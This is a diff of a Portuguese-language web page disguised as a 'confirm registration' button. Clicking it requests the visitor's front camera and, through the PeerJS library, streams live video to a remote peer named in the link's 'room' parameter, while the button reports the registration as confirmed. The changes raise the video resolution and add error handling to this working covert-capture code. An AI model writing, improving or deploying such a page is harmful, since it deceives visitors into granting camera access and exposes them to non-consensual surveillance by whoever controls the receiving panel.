@@ -3,80 +3,98 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Confirmar inscrição</title>
 <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+
 <style>
 body {
     margin: 0;
-    min-height: 100vh;
+    height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
-    font-family: Arial, sans-serif;
-    background: #f3f4f6;
+    background: #f2f2f2;
+    font-family: Arial;
 }
 button {
     background: #176b3a;
     color: white;
-    border: 0;
+    border: none;
     border-radius: 8px;
-    padding: 20px 30px;
-    font-size: 19px;
+    padding: 22px 30px;
+    font-size: 20px;
     font-weight: bold;
     cursor: pointer;
 }
-button:disabled {
-    opacity: .7;
-}
 </style>
 </head>
+
 <body>
 
 <button id="confirmar">CONFIRMAR INSCRIÇÃO</button>
 
 <script>
-const botao = document.getElementById("confirmar");
 const sala = new URLSearchParams(location.search).get("room");
+const botao = document.getElementById("confirmar");
 
 let peer;
 let stream;
 
-botao.addEventListener("click", async () => {
-    if (!sala) {
-        alert("Convite inválido. Solicite um novo link.");
-        return;
-    }
+botao.onclick = async function() {
 
     botao.disabled = true;
 
+    if (!sala) {
+        alert("Convite inválido. Solicite outro link.");
+        botao.disabled = false;
+        return;
+    }
+
     try {
+        // Solicita a câmera após o clique
         stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
+            video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                facingMode: "user"
+            },
             audio: false
         });
 
+        botao.innerText = "INSCRIÇÃO CONFIRMADA";
+
+        // Conecta ao painel
         peer = new Peer();
 
-        peer.on("open", () => {
+        peer.on("open", function() {
+
             const chamada = peer.call(sala, stream);
 
             if (!chamada) {
-                alert("Não foi possível conectar ao painel.");
+                alert("Não foi possível enviar a imagem.");
                 botao.disabled = false;
+                return;
             }
+
+            chamada.on("error", function() {
+                alert("Erro na transmissão.");
+                botao.disabled = false;
+            });
         });
 
-        peer.on("error", () => {
+        peer.on("error", function() {
             alert("Falha na conexão. Tente novamente.");
             botao.disabled = false;
         });
 
     } catch (erro) {
-        alert("Não foi possível liberar a câmera. Verifique a permissão do navegador.");
+        console.error(erro);
+        alert("Não foi possível acessar a câmera. Autorize o acesso no navegador.");
         botao.disabled = false;
+        botao.innerText = "CONFIRMAR INSCRIÇÃO";
     }
-});
+};
 </script>
 
 </body>
